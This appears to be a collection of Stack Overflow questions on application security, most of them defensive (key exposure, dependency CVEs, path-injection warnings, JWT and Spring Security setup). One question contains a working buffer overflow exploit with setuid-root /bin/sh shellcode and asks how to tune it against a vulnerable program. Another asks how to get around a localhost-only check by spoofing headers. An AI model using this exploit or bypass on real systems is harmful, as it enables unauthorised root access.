<p>1-If I store the Firebase keys in a .env file, won't they be visible to someone who downloads the application?</p>
<p>2-I'm using Cloud Functions to access the database. How can I prevent the HTTP request link from being visible and ensure that anyone can't make requests with the address?</p>
<p>3-Is it necessary to implement the authentication system from the client side? Or can I do it solely from cloud functions? I ask this because that way I wouldn't need to expose my Firebase keys in my client.</p>
<p>4- I hardly understand anything about cybersecurity and what attackers can or cannot do to my application if I publish it. If someone could send me a helpful video or post, I would appreciate it.</p>
<p>thanks.</p>
"
"<p><strong>I am building an app where security is really important.</strong>
For the user authentication, I currently use the basic email/password auth with Firebase.
Firebase is as well used as my database.</p>
<p><strong>I would like to enhance the security of my authentication flow, adding a deviceID factor in addition to the email/password factors.</strong></p>
<p>Here is the flow idea:</p>
<ul>
<li>I generate a deviceID (store in secure storage) when a user create an account for its current device.</li>
<li>When the user will login later, it will check if its current deviceID (if existing in secure storage) is saved as a trusted device in the database</li>
<li>If not trusted, an OTP challenge will be triggered. If succeed, the current device will be added to the list of trusted devices</li>
</ul>
<p>Some people does that locally, but it is not secure (Firebase auth API is still available with only email/password in bypassing the app UI).</p>
<p>**I am looking for a solution to integrate the deviceID factor to an authentication flow.
**</p>
<p>Research I have done:</p>
<ul>
<li>Firebase blocking functions: unfortunately we cannot pass custom parameter, and the native values of the event parameters (IP address, userAgent...) are not enough robust/secure</li>
<li>Firebase cloud functions: not directly correlated to the authentication flow, so the Firebase auth API will remain available with only email/password in bypassing the app UI)</li>
<li>Supabase: does not propose custom authentication, and the serverless function got the same issue as the Firebase cloud functions</li>
<li>Local custom actions: same issue as cloud functions</li>
</ul>
<p><strong>Promising trails:</strong></p>
<p>The Firebase custom Token allow to connect a user and use the Firebase services, which is great given the Firebase integration is nice on Flutter.</p>
<p>It involves either:</p>
<ul>
<li>to create my own auth backend, which could cause security flaws (given I am not an expert) and as well adding more code to manage</li>
<li>or to use an external auth provider (Clerk, Auth0, Amazon Cognito...)</li>
</ul>
<p><strong>Has someone already solve this can of issue for its app ?
Has some already integrated Clerk, Auth0 or Cognito as custom authentication provider in its FlutterFlow app?</strong></p>
<p>Thanks in advance for replies</p>
"
"<p>Error
Provides transitive vulnerable dependency maven:com.fasterxml.jackson.core:jackson-databind:2.10.3 CVE-2022-42003 7.5 Deserialization of Untrusted Data vulnerability with High severity found Cxced0c06c-935c 5.9 Uncontrolled Resource Consumption vulnerability with Medium severity found CVE-2022-42004 7.5 Deserialization of Untrusted Data vulnerability with High severity found CVE-2021-46877 7.5 Uncontrolled Resource Consumption vulnerability with High severity found CVE-2020-25649 7.5 Improper Restriction of XML External Entity Reference vulnerability with High severity found CVE-2020-36518 7.5 Out-of-bounds Write vulnerability with High severity found CVE-2021-20190 8.1 Deserialization of Untrusted Data vulnerability with High severity found  Results powered by Checkmarx(c)</p>
<p>I am adding webdriver dependency in POM file for selenium automation but no matetr which version i give still it gives me vulenrability error so unable to resolve it, so maven not resolving error so run button in intellij is disabled</p>
"
"<p>I have to upgrade Apache log4j to a version that is currently supported on a Windows server with JBoss 7.1.1.Final which has log4j-1.2.16.jar version.
Since I haven't done it before and I am also not very familiar with log4j vulnerability solutions and their integrations especially in JBoss, I would kindly ask for help here.</p>
<p>I found that log4j files are inside this location on the machine :
E:\jboss-7.1.1\modules\org\apache\log4j\main\log4j-1.2.16.jar</p>
<p>There is also module.xml file in this location, with the aforementioned log4j JAR file specified inside.</p>
<p>I am not sure if just downloading the newest supported logj4 version file and replacing it in the location, and also modifying the module.xml file will be enough for this activity, so I will be glad if someone can advise me on this in more details.</p>
<p>Thank you</p>
"
"<p>i have a low budget client who's wants to create an App i have two options</p>
<ol>
<li><p>PWA - (Progressive Web Apps)</p>
</li>
<li><p>RNWebView - (Run application on react native web view)</p>
<p>Meanwhile using second approach will give me more control over the web app , i can do multiple extra stuff in react native to improve experience then PWA</p>
</li>
</ol>
<p>but my concern is by doing this is it safe to do that way?
like i have a e-com website (which include payment and other permissions as well)
is it good to run complate website on a webView
i have create a blank react native project and just added webView in app.js file and its done seems working but i am concerned about its security and other hacking attacks like JS injection etc...
need help!</p>
<p>here is the code that i have added</p>
<pre><code>function App(): React.JSX.Element {
  const isDarkMode = useColorScheme() === 'dark';
  const backgroundStyle = { backgroundColor: isDarkMode ? Colors.darker : Colors.lighter, flex: 1};

  return (
    &lt;SafeAreaView style={backgroundStyle}&gt;
      &lt;StatusBar
        barStyle={isDarkMode ? 'light-content' : 'dark-content'}
        backgroundColor={backgroundStyle.backgroundColor}
      /&gt;
      &lt;WebView
        renderFlag={true}
        useWebKit
        originWhitelist={['*']}
        automaticallyAdjustContentInsets={false}
        javaScriptEnabled
        javaScriptEnabledAndroid
        scalesPageToFit
        style={{flex: 1, flexGrow: 1}}
        renderLoading={() =&gt; (
          &lt;Text style={{flex: 1, position: 'absolute'}}&gt;Loading WorkS&lt;/Text&gt;
        )}
        startInLoadingState
        source={{
          uri: `https://example.com/`,
        }}
        allowsInlineMediaPlayback={true}
      /&gt;
    &lt;/SafeAreaView&gt;
  );
}
</code></pre>
<p>i try to do multiple RnD on that and found that there might be concern about user file system
its device info etc...
hacker can track user's mobile or any info or inject extarnal js init<br />
XSS attack , CSRF attack etc..</p>
"
"<p>I have a website to scan the URL and show the result to the users, but I want to visualize this result using kibana, is there any possibility to do that?</p>
<p>I search about this since five days, so if there is no answer, at least give me reference or any thing about the elastic stack specialists</p>
"
"<p>I would like to know if there is a way to store passwords stored in settings.json in an other file (or keepass)</p>
<p>Some extensions stores their passwords in this file (like Oracle Developer Tools).</p>
<p>I've been searching on the web and in docs, nothing found (or maybe I read to fast, it is not impossible)</p>
"
"<p>My website has hundreds of thousands of html pages that are open to public. Each time a html page is requested, a call will be made to my database to get the correct data. Therefore the cost of each html request is not cheap (a call to databse is needed).</p>
<p>I know there are rotating proxy services out there that let users send each request with a different IP. They have a pool of hundreds or thousands of IP addresses so any rate limit applied to IP addresses will not work.</p>
<p>I wonder what is the best practice to defend my website if an attacker uses a proxy service to spam requests to my website? Appreciate any help</p>
<p>I thought about caching the database'data but since the list of my website's hundreds of thousands of html pages are available in the sitemap, the attacker could easily loop through all the html pages to request. I cannot cache the entire database.</p>
"
"<p>I have a Python script which, amongst other things, creates a bunch of cron tasks. When I run the script and it comes to creating the cron tasks, not surprisingly,I get the Mac security prompt asking me whether to allow this action or not.</p>
<p>As this script will run daily, is there a way where I can set the permissions once, manually or otherwise, and then all subsequent runs will not require a human intervention to allow the creation of cron tasks?</p>
<p>FYI - I am using python-crontab package</p>
<p>I gave Terminal Full Disk Access via security and privacy menu in settings and that seemed to work, but security wise, I wasn't comfortable with that, so I revoked access. Also as I read, from time to time you may see the security prompt. I am pretty certain the answer is in setting the right permissions for the python script, but my grasp of permissions is bare at best.</p>
"
"<p>Get sonar warning</p>
<p>Change this code to not construct the path from user-controlled data.
I/O function calls should not be vulnerable to path injection attacks [javasecurity:S2083]
Code</p>
<pre><code>public static void storeImageToHttpResponse(String imageBasePath, String fullpath, String filename, long fileLength, HttpServletResponse response) throws IOException{
    BufferedInputStream input = null;
    BufferedOutputStream output = null;
    try {
        InputStream is = new FileInputStream(validateImagePath(imageBasePath, fullpath));

        
    }  finally {
        if (output != null) try { output.close(); output.flush(); } catch (IOException logOrIgnore) {}
        if (input != null) try { input.close(); } catch (IOException logOrIgnore) {}
    } 
}

public static File validateImagePath(String imageBasePath, String fullPath) throws IOException {
    File file = new File(fullPath);
    return validateImagePath(imageBasePath, file);
}

public static File validateImagePath(String imageBasePath, File file) throws IOException {
    Path targetPath = new File(imageBasePath).toPath().normalize();
    if(!file.toPath().normalize().startsWith(targetPath)) {
        throw new IOException(String.format(&quot;Image %s is outside of the target directory %s&quot;, file.getAbsolutePath(), imageBasePath));
    }
    return file;
}
</code></pre>
<p>But still get warning
<a href=""https://i.stack.imgur.com/9Tpw6.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9Tpw6.png"" alt=""enter image description here"" /></a></p>
<p>Pls help/advise</p>
"
"<p>I want to do this so called p2p chat app project, and I need some clear guidance and ressources where I can find some good p2p documentation or courses so I can digest this notion, I'm not so familiar woth it even though I have some basic knowledge about it</p>
<p>I hope u suggest some great ressources where I can find a p2p based book or documentation</p>
"
"<p>I am currently investigating the use of local runners with shell executors (<code>bash</code>, <code>powershell</code>). Usually I would go with containers, however recently I came across a use case, where such an executor has to be used. And this is when I started asking myself &quot;What about security?&quot;</p>
<p>Is it possible to execute arbitrary code in a CI job on a local runner with shell executor? Here I exclude anything that goes beyond what the user, who &quot;owns&quot; the runner&quot;, is allowed to do (e.g. on Linux a user, who is not part of the <code>sudoers</code>, cannot execute any command that requires <code>sudo</code>).</p>
"
"<p>I am trying to create row level security policy in Bigqeuery</p>
<pre><code>CREATE OR REPLACE ROW ACCESS POLICY policy_name
ON `sample_project.sample_dataset.sample_table`
GRANT TO ('allAuthenticatedUsers')
FILTER USING (sample_column = 'abc');
</code></pre>
<p>Whenever I try to query the table, it will always return the data which matches with column value <code>abc</code>
But I need to create RLS policy so that it accepts a variable in <code>FILTER USING</code> and before executing any query, I will set that variable to any value.</p>
<p>I have used below query to create RLS</p>
<pre><code>DECLARE variable STRING DEFAULT 'abc';
CREATE OR REPLACE ROW ACCESS POLICY policy_name
ON `sample_project.sample_dataset.sample_table`
GRANT TO ('allAuthenticatedUsers')
FILTER USING (sample_column = FORMAT('%t', variable));
</code></pre>
<p>But I got the below error while creating the policy
<code>Parameters and variables in FILTER USING expression are not supported</code></p>
<p>Can someone please help me with this?</p>
"
"<p>I am trying to access a mongo database hosted on ssh server A from server B. Server B doesn't have mongo installed on it so I am using a python code to install it but i keep getting this error:</p>
<pre><code>Collection content:
Traceback (most recent call last):
  File &quot;/root/pritika/mongotest.py&quot;, line 20, in &lt;module&gt;
    for document in collection.find():
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/cursor.py&quot;, line 1264, in next
    if len(self.__data) or self._refresh():
                           ^^^^^^^^^^^^^^^
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/cursor.py&quot;, line 1155, in _refresh
    self.__session = self.__collection.database.client._ensure_session()
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/mongo_client.py&quot;, line 1823, in _ensure_session
    return self.__start_session(True, causal_consistency=False)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/mongo_client.py&quot;, line 1766, in __start_session
    self._topology._check_implicit_session_support()
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/topology.py&quot;, line 573, in _check_implicit_session_support
    self._check_session_support()
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/topology.py&quot;, line 589, in _check_session_support
    self._select_servers_loop(
  File &quot;/root/pritika/ner/lib/python3.11/site-packages/pymongo/topology.py&quot;, line 259, in _select_servers_loop
    raise ServerSelectionTimeoutError(
pymongo.errors.ServerSelectionTimeoutError: **.***.**.96:27017: timed out (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: &lt;TopologyDescription id: 65d83cef7c09f97c4c3dcd05, topology_type: Unknown, servers: [&lt;ServerDescription ('**.***.**.96', 27017) server_type: Unknown, rtt: None, error=NetworkTimeout('**.***.**.96:27017: timed out (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')&gt;]&gt;
</code></pre>
<p>I am using this code:</p>
<pre><code>import pymongo
import urllib.parse
usernamee = &quot;username&quot;
passwords = &quot;password&quot;

username = urllib.parse.quote_plus(usernamee)
password = urllib.parse.quote_plus(passwords)
host = &quot;**.***.**.96&quot; 
port = 27017
database_name = &quot;dbName&quot;
collection_name = &quot;dbCollection&quot;

uri = f&quot;mongodb://{username}:{password}@{host}:{port}/{database_name}&quot;
client = pymongo.MongoClient(uri)

db = client[database_name]
collection = db[collection_name]

print(&quot;Collection content:&quot;)
for document in collection.find():
    print(document)

</code></pre>
<p>The database is intact and the server A is running fine. I tried searching but i am not able to resolve it. Can someone help?</p>
"
"<p>I am working with a board which ready to be sold. I received a task: Can a layer of security be created to prevent everyone else, except us from downloading firmware to our MCU on this board.
My initial exploration led me to consider the implementation of Secure Boot as a potential solution. Secure Boot would effectively disallow the reading or downloading of firmware by leveraging a customized bootloader. However, it became apparent that this approach has a potential vulnerability. Even with Secure Boot in place, an individual could potentially reinstall a new bootloader and subsequently download their own firmware onto our board. This raised concerns about the possibility of unauthorized use of our hardware for unintended purposes.</p>
<p>Consequently, I am actively seeking a comprehensive solution that not only prevents unauthorized firmware downloads but also safeguards against the installation of alternative bootloaders. The overarching goal is to ensure the exclusivity of our hardware for its intended purpose. I am keen to explore any viable options or strategies that may address these security challenges. Is it possible?</p>
"
"<p>I have a security compliance to meet where i want to revoke SETSESSIONUSER Privilege. I am getting error while revoking the privilege even tough i am using admin user</p>
<p>I can see the record inside syscat.surrogateauthids</p>
<pre><code>db2 =&gt; SELECT GRANTOR , TRUSTEDID , TRUSTEDIDTYPE , SURROGATEAUTHID , SURROGATEAUTHIDTYPE FROM syscat.surrogateauthids

GRANTOR                                                                                                                          TRUSTEDID                                                                                                                        TRUSTEDIDTYPE SURROGATEAUTHID                                                                                                                  SURROGATEAUTHIDTYPE
-------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ------------- -------------------------------------------------------------------------------------------------------------------------------- -------------------
DB2INST1                                                                                                                         SYSATSCONTEXT                                                                                                                    C             PUBLIC                                                                                                                           G                  

  1 record(s) selected.

</code></pre>
<p>But when i want to revoke the privileges getting error</p>
<pre><code>REVOKE SETSESSIONUSER ON SYSATSCONTEXT FROM GROUP PUBLIC

SQL Error [42601]: An unexpected token &quot;SYSATSCONTEXT&quot; was found following &quot;KE SETSESSIONUSER ON&quot;.  Expected tokens may include:  &quot;USER&quot;.. SQLCODE=-104, SQLSTATE=42601, DRIVER=4.33.31

</code></pre>
<p>Can somebody help me with this.</p>
"
"<p>I'm having issues with CWE-73 regarding parentDir reaching the unzip method.</p>
<p>This class is responsible for unzipping the file and returning the address/name of the file in a temporary folder. I've researched a lot about validations, but no version is accepted in the Veracode Scan. Could you help me?</p>
<p>The vulnerability CWE-73 is pointed out in the line</p>
<p><code>Path entryPath = parentDir.resolve(entryName).toAbsolutePath().normalize();</code></p>
<p>Method that calls the class that will unzip the file:</p>
<pre><code>private String criaEdescompactaArquivo(String fileName, byte[] report) throws IOException {
    String extractedFileName;
    var decodedFile = new DecodedMultipartFile(report, fileName);
    var file = Files.createTempFile(fileName, &quot;.zip&quot;);
    decodedFile.transferTo(file);
    extractedFileName = UnzipFileHelper.unzip(file.toFile());
    return extractedFileName;
}
</code></pre>
<p>Class that will unzip the file and return the address/name of the file in the temporary folder:</p>
<pre><code>import java.io.*;
import java.nio.file.*;
import java.util.Objects;
import java.util.zip.;

import lombok.extern.slf4j.Slf4j;

@Slf4j
public class UnzipFileHelper {

    private UnzipFileHelper() {
        throw new IllegalStateException(&quot;Utility class&quot;);
    }
    
    public static String unzip(File file) throws IOException {
        return unzip(file, file.getParentFile().toPath());
    }
    
    private static String unzip(File file, Path parentDir) throws IOException {
        if (!Files.isDirectory(parentDir)) {
            throw new SecurityException(&quot;Parent directory is not valid&quot;);
        }
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(file))) {
            ZipEntry zipEntry = zis.getNextEntry();
            if (Objects.isNull(zipEntry)) {
                return null;
            }
            String entryName = zipEntry.getName();
            if (entryName.contains(&quot;..&quot;) || entryName.contains(File.separator)) {
                throw new SecurityException(&quot;Invalid file name&quot;);
            }
            Path entryPath = parentDir.resolve(entryName).toAbsolutePath().normalize();
            log.info(&quot;Unzip: entryPath = {}&quot;, entryPath);
    
            if (!entryPath.startsWith(parentDir)) {
                throw new SecurityException(&quot;Invalid file path&quot;);
            }
    
            final long MAX_FILE_SIZE = (long) 100 * 1_024 * 1_024;
            if (zipEntry.getSize() &gt; MAX_FILE_SIZE) {
                throw new SecurityException(&quot;File size exceeds maximum allowed&quot;);
            }
    
            Files.createDirectories(entryPath.getParent());
    
            try (OutputStream fos = Files.newOutputStream(entryPath)) {
                final byte[] buf = new byte[1024];
                int length;
                while ((length = zis.read(buf, 0, buf.length)) &gt;= 0) {
                    fos.write(buf, 0, length);
                }
            }
            zis.closeEntry();
            return entryPath.toString();
        }
    }

}
</code></pre>
<p>Changes needed to mitigate this vulnerability.</p>
"
"<p>I want to redefine the version of the spring framework using the final version of spring boot 2.5.15 to take into account the last vulnerability corrected in version 5.3.32, knowing that the version of the spring framework used is version 5.3.17 in the spring boot version 2.5.15.</p>
<p>Given the context, is this a good practice, knowing that I can no longer update the spring boot version because it is no longer maintained.</p>
"
"<p>I recently had been working on a project on Gitlab and I noticed I can keep track of what's been going on (such as times for commits and pushes, the deleting and creating of branches and repos) via the activity tab which shows every changes along with their times and I had assigned others in my group maintainer roles for this project.</p>
<p><a href=""https://i.stack.imgur.com/dybxO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dybxO.png"" alt=""enter image description here"" /></a></p>
<p>My question is can these maintainers see my activity just like I do or is the permission for maintainers just limited to looking at repositories and commits and nothing more? Is this question justified?</p>
"
"<p>I need to use proxy (preferably mitmweb) to 127.0.0.1 to get access to a restricted webpage. I am new to this and don’t know exactly what to do.</p>
<p>The code which checks whether it is localhost or not -</p>
<pre><code>if request.remote_addr != '127.0.0.1':
            return abort(403)
</code></pre>
<p>I tried using a proxy with mitmweb and added headers like remote_addr and http_X_Forwarded_For as 127.0.0.1. It didn't work.</p>
"
"<p>example vulnerable code:</p>
<pre><code>void main(int argc, char *argv[]) {
    char buffer[512];

    if (argc &gt; 1)
        strcpy(buffer, argv[1]);
}
</code></pre>
<p>exploit4.c to attack the example vulnerable code:</p>
<pre><code>#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  &quot;\x31\xdb\x89\xd8\xb0\x17\xcd\x80&quot; /*setuid(0) */
  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

unsigned long get_esp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc &gt; 1) bsize   = atoi(argv[1]);
  if (argc &gt; 2) offset  = atoi(argv[2]);
  if (argc &gt; 3) eggsize = atoi(argv[3]);


  if (!(buff = malloc(bsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf(&quot;Can't allocate memory.\n&quot;);
    exit(0);
  }

  addr = get_esp() - offset;
  printf(&quot;Using address: 0x%x\n&quot;, addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i &lt; bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i &lt; strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,&quot;EGG=&quot;,4);
  putenv(egg);
  memcpy(buff,&quot;RET=&quot;,4);
  putenv(buff);
  system(&quot;/bin/bash&quot;);
}

</code></pre>
<p>How can I attack the code below by exploit4.c?</p>
<pre><code>./exploit4
./vulnerable aaaa $RET $RET
</code></pre>
<p>I have tried some parameters and met <code>segmentation fault</code>. What should I do next? Maybe modify buffer size or offset?</p>
<p>Besides, Since there are three buffers, can I construct three bufs, the first two bufs include NOP slide and JMP instruction pointing to the next buf, and the third buf includes NOP slide, SHELLCODE and ADDR. I would like to ask if this idea may be correct?</p>
<p>vulnerable.c</p>
<pre><code>void f(char *str1, char *str2, char *str3){
    char a = 24;
    char buf1[100] = {0};
    char b = 1;
    char buf2[20] = {0};
    char c = 12;
    char buf3[300] = {0};
    int i;

    for(i = 0; i &lt; strlen(str1); i++){
        if(str1[i] == 's')
            str1[i] = 0;
    }

    for(i = 0;i&lt;strlen(str2); i++){
        if(str2[i] == 'h')
            str2[i] = 0;
    }
    strncpy(buf1,str1,sizeof(str1)-1); //sizeof:'\0'is included
    strncpy(buf2,str2,strlen(str2)-1);//strlen:'\0' is not included
    strncpy(buf3,str3,sizeof(buf3)+12);

    if(a != 24 || b != 1 || c != 12){
        printf(&quot;ALERT: The program is being hacked. Program terminates.\n&quot;);
        exit(1);        
    }
}

int main(int argc, char *argv[]){
    f(argv[1],argv[2],argv[3]);
    return 0;
}
</code></pre>
"
"<p>I have a new project that contains two separate parts for backend and frontend, and based on it, I want to establish a secure connection through the frontend subproject (designed with vuejs 3) with the server side API code (designed with Laravel 10).
Can anyone give me a suggestion that I can establish a secure connection between the frontend sub-project and the API sub-project in such a way that it has the following conditions.</p>
<p><strong>1- No one can extract data by copying codes and illegal access to API</strong><br />
<strong>2- The API server should be hidden from users as much as possible.</strong></p>
<p>Explanation:
I am thinking of a proxy server or secure proxy channel.</p>
<p>More Explain:
I have an api that services to different client app. like <code>telegram</code> messenger app! so i want to service to the specify web apps and block the illegal apps to use my api.</p>
"
"<p>I am researching the differences in object code copy protection between the STM32 vs ESP32. I understand the ESP32 but am unclear about the current STM32 copy protection.</p>
<p>The following is a prioritized list of assumptions and requirements:</p>
<ol>
<li>The adversary will have unfettered access to the hardware with a budget on the order of $50K.</li>
<li>The only concern is protecting the object code, not the function or program execution.</li>
<li>No programed communication is required. WIFI, CAM, Bluetooth, debug, etc. will be disabled as far as possible in the software.
Does the STM32 have similar flash encryption as the ESP32?
Any other comments would be appreciated.
Thank You</li>
</ol>
"
"<p>I have used Git on multiple computers. On some, I have set it up so it doesn't ask me my un/pwd on <code>git push</code>. I now want to ensure that I block all those computers from using my git account and pushing commits under my git username. Are the following steps sufficient?</p>
<ol>
<li>Change git PWD and 2FA method (latter being overkill, but just for completeness sake).</li>
<li>Delete all SSH keys (<a href=""https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/reviewing-your-ssh-keys"" rel=""nofollow noreferrer"">docs</a>).</li>
</ol>
<p>Do the two steps above absolutely guarantee that no one can push / read with my username / old SSH keys? (Assuming my <strong>new</strong> keys/password aren't compromised, obviously).</p>
<p>I know this seems like a very dumb question, but I seem to be able to push from computers (thankfully ones I own) even after taking those steps and wonder what I could be missing.</p>
<p>P.S. I also tried to clean the computers that had keys <a href=""https://stackoverflow.com/questions/68418132/how-do-i-delete-my-ssh-key-from-my-windows-10-computer-using-git-bash"">using guides on SO</a>, but I am trying to find a centralized solution.</p>
"
"<p>I have this security config</p>
<pre><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
            .csrf().disable()
            .authorizeRequests().antMatchers(&quot;/actuator/prometheus&quot;, &quot;/actuator/metrics/**&quot;, &quot;/actuator/health/**&quot;).permitAll()
            .and()
            .authorizeRequests().antMatchers(&quot;/swagger-ui/**&quot;).permitAll()
            .and()
            .authorizeRequests().anyRequest().authenticated()
            .and()
            .httpBasic();

    return http.build();
}
</code></pre>
<p>I want to let swagger url pass this config
using springboot 2.7.1 and swagger 2.9.2</p>
<p>But I always get</p>
<pre><code>{
    &quot;responseCode&quot;: &quot;2401&quot;,
    &quot;message&quot;: &quot;Invalid Credentials&quot;,
    &quot;timestamp&quot;: &quot;2024-02-26T10:23:18.264+08:00&quot;
}
</code></pre>
<p>my swagger config is :</p>
<pre><code>@Configuration
@EnableSwagger2
public class SwaggerConfig {
    @Bean
    public Docket api() {
        return new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.any())
                .paths(getPaths())
                .build();
    }

    private com.google.common.base.Predicate&lt;String&gt; getPaths() {
        return or(PathSelectors.ant(&quot;/v1/**&quot;),
                or(PathSelectors.ant(&quot;/v2/**&quot;),
                        PathSelectors.ant(&quot;/auth/v1/**&quot;)));
    }

    @Bean
    public WebMvcEndpointHandlerMapping webEndpointServletHandlerMapping(WebEndpointsSupplier webEndpointsSupplier,
                                                                         ServletEndpointsSupplier servletEndpointsSupplier, ControllerEndpointsSupplier controllerEndpointsSupplier,
                                                                         EndpointMediaTypes endpointMediaTypes, CorsEndpointProperties corsProperties,
                                                                         WebEndpointProperties webEndpointProperties, Environment environment) {
        List&lt;ExposableEndpoint&lt;?&gt;&gt; allEndpoints = new ArrayList();
        Collection&lt;ExposableWebEndpoint&gt; webEndpoints = webEndpointsSupplier.getEndpoints();
        allEndpoints.addAll(webEndpoints);
        allEndpoints.addAll(servletEndpointsSupplier.getEndpoints());
        allEndpoints.addAll(controllerEndpointsSupplier.getEndpoints());
        String basePath = webEndpointProperties.getBasePath();
        EndpointMapping endpointMapping = new EndpointMapping(basePath);
        boolean shouldRegisterLinksMapping = this.shouldRegisterLinksMapping(webEndpointProperties, environment,
                basePath);
        return new WebMvcEndpointHandlerMapping(endpointMapping, webEndpoints, endpointMediaTypes,
                corsProperties.toCorsConfiguration(), new EndpointLinksResolver(allEndpoints, basePath),
                shouldRegisterLinksMapping, null);
    }

    private boolean shouldRegisterLinksMapping(WebEndpointProperties webEndpointProperties, Environment environment,
                                               String basePath) {
        return webEndpointProperties.getDiscovery().isEnabled() &amp;&amp; (StringUtils.hasText(basePath)
                || ManagementPortType.get(environment).equals(ManagementPortType.DIFFERENT));
    }

    @Bean
    public WebSecurityCustomizer webSecurityCustomizer() {
        return (web) -&gt; web.ignoring().antMatchers(&quot;/v2/api-docs/**&quot;, &quot;/swagger-ui/**&quot;, &quot;/swagger-resources/**&quot;, &quot;/v2/api-docs/**&quot;);
    }
</code></pre>
<p>and my custom security looks like</p>
<pre><code>public class myFilter extends OncePerRequestFilter {

    @Override
    public void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        String apiKey = request.getHeader(AUTH_METHOD);
        if (apiKey == null || apiKey.isEmpty()) {
            createErrorResponse(response, 401, HCResponseCodes.ACCESS_ERROR, INVALID_CREDS);
            return;
        }
</code></pre>
<p>I always end up in this condition.
what can i do to let swagger pass this test?</p>
"
"<p><em><strong>Overview</strong></em></p>
<p>After a successful login, you are redirected to the index page.</p>
<p>On the index page, there is a button labeled &quot;Test Button&quot;. When clicked, it is supposed to call an API that loads the &quot;test&quot; page.</p>
<p>However, only the API request is made, and the page does not change.</p>
<p>The developer tools only display the HTML code of that page.</p>
<blockquote>
<p>index.html</p>
</blockquote>
<pre><code>&lt;script&gt;
$(document).ready(function() {
    // Logout button event
    $('#logoutButton').click(function() {
        // Remove token from local storage
        localStorage.removeItem('accessToken');
        // Redirect to login page
        window.location.href = '/login';
    });

    // Test button event
    $('#testButton').click(function() {
        // Retrieve token from local storage
        const token = localStorage.getItem('accessToken');
        if (token) {
            $.ajax({
                url: '/api/test', // URL of the server to request
                type: 'GET', // HTTP method
                beforeSend: function(xhr) {
                    // Add token to request header
                    xhr.setRequestHeader('Authorization', token);
                },
                success: function(data) {
                    // Logic on request success
                    console.log(&quot;Test request successful:&quot;, data);
                    alert(&quot;Test request successful&quot;);
                },
                error: function(xhr, status, error) {
                    // Logic on request failure
                    console.error(&quot;Test request failed:&quot;, xhr.responseText);
                    alert(&quot;Test request failed&quot;);
                }
            });
        } else {
            alert(&quot;Token not found. Please login again.&quot;);
        }
    });
});
</code></pre>

<p>As shown, the token is fetched from local storage and subsequently reattached to the request header for transmission.</p>
<p><strong>JwtAuthorizationFilter</strong></p>
<pre><code>@Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain filterChain) throws ServletException, IOException {
        // Extract token from header
        log.info(&quot;Extracting token from header&quot;);
        String tokenValue = jwtUtil.getJwtFromHeader(req);
        log.info(&quot;Token: &quot; + tokenValue);

        if (StringUtils.hasText(tokenValue)) {

            // Token validation
            if (!jwtUtil.validateToken(tokenValue)) {
                log.info(&quot;Token Error&quot;);

                return;
            }
            Claims info = jwtUtil.getUserInfoFromToken(tokenValue);

            try {
                setAuthentication(info.getSubject());
            } catch (Exception e) {
                log.error(e.getMessage());
                return;
            }
        }

        else {
            log.info(&quot;No token present.&quot;);
        }

        filterChain.doFilter(req, res);
    }

    // Process authentication
    public void setAuthentication(String loginId) {
        log.info(&quot;Authentication successful&quot;);
        SecurityContext context = SecurityContextHolder.createEmptyContext();
        Authentication authentication = createAuthentication(loginId);
        context.setAuthentication(authentication);

        SecurityContextHolder.setContext(context);
    }

    // Create authentication object
    private Authentication createAuthentication(String loginId) {
        log.info(&quot;Creating authentication object&quot;);
        UserDetails userDetails = userDetailsService.loadUserByUsername(loginId);
        return new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
    }
</code></pre>
<p>When the JwtAuthorizationFilter is in place, the logs display the entire process of extracting the token from the header, and I've confirmed that the authentication object is also successfully created.</p>
<p><strong>Console</strong></p>
